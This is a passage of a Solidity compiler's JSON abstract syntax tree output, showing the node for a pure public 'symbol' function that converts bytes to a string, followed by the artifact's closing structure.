															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 1038,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "7843:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 1037,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "7843:6:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1043,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7843:41:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1031,
												"id": 1044,
												"nodeType": "Return",
												"src": "7836:48:3"
											}
										]
									},
									"documentation": null,
									"functionSelector": "95d89b41",
									"id": 1046,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "symbol",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1028,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7734:2:3"
									},
									"returnParameters": {
										"id": 1031,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1030,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1046,
												"src": "7758:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1029,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "7758:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7757:15:3"
									},
									"scope": 1047,
									"src": "7719:170:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 1048,
							"src": "435:7457:3"
						}
					],
					"src": "33:7863:3"
				},
				"id": 3
			}
		}
	}
}